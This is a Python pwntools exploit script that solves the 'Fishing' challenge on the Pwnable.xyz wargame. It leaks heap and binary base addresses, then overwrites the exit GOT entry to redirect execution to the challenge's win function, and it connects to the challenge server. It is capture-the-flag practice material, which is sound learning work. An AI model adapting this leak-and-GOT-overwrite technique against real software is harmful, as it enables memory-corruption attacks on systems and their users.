from pwn import *

# Pwnable.xyz Fishing challenge

context(kernel="amd64", arch="amd64", log_level="info")

"""
====================
1. Add group member
2. Modify group member
3. Write in the guest book
4. Go fishing
5. Tell them to come back
6. Leave
> 
"""

def create_member(p, name, job, age=10):
	p.sendlineafter(b"> ", b"1")
	p.sendafter(b"Name: ", name)
	p.sendafter(b"Job: ", job)
	p.sendlineafter(b"Age: ", str(age).encode("utf-8"))

def modify_member(p, member_num, new_name, new_job, new_age=10):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"to change?", str(member_num).encode("utf-8"))
	p.sendafter(b"Name: ", new_name)
	p.sendafter(b"Job: ", new_job)
	p.sendlineafter(b"Age: ", str(new_age).encode("utf-8"))

def write_book(p, data):
	p.sendlineafter(b"> ", b"3")
	p.sendafter(b"to say?", data)

def go_fishing(p):
	p.sendlineafter(b"> ", b"4")

	p.recvuntil(b"ALERT!!!\n")
	leaked_data = p.recvuntil(b" has fallen")[:-len(" has fallen")]
	print(f"[+] Leaked: {leaked_data}")
	# Do dummy request, so next call can use p.recvuntil(b"> ", ....)
	p.sendline(b"2")
	p.sendlineafter(b"to change?", b"-1")
	return leaked_data

def retreat(p):
	p.sendlineafter(b"> ", b"5")

def main():
	e = ELF("challenge")
	env = dict(os.environ)
	env["LD_PRELOAD"] = "/home/johnny/Documents/glibc-all-in-one/out/2.27_without_tcache/lib/libc-2.27.so"
	if 0:
		p = process(e.path, env=env)
		# gdb.attach(p, gdbscript="b write_in_book\nb err")
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		p = remote("svc.pwnable.xyz", 30045)

	win_off = e.symbols["win"]
	exit_got = e.got["exit"]
	bin_name_off = 0x156a

	create_member(p, b"Test1", b"Job1")
	go_fishing(p)
	# modify_member(p, 1, b"AABBA", b"\x10")
	retreat(p)
	create_member(p, b"$", b"$")
	data = go_fishing(p)
	assert(len(data) == 6)
	heap_base = u64(data+b"\x00\x00")-ord("$")
	print(f"Get heap base: {hex(heap_base)} ")
	
	write_book(p, p64(heap_base+0x10))
	create_member(p, b"Test2", b"Job2")
	retreat(p)

	some_leak = go_fishing(p)
	bin_name = u64(some_leak+b"\x00\x00")
	e_base = bin_name - bin_name_off

	retreat(p)

	# This should write 
	write_book(p, p64(exit_got+e_base))

	modify_member(p, 1, p64(win_off+e_base), b"12345")

	retreat(p)
	# Trigger call to exit()
	p.sendlineafter(b"> ", b"0")
	p.recvline()

	print(p.recvuntil(b"Welcome to ")[:-len("Welcome to ")])
	p.sendlineafter(b"> ", b"6")




main()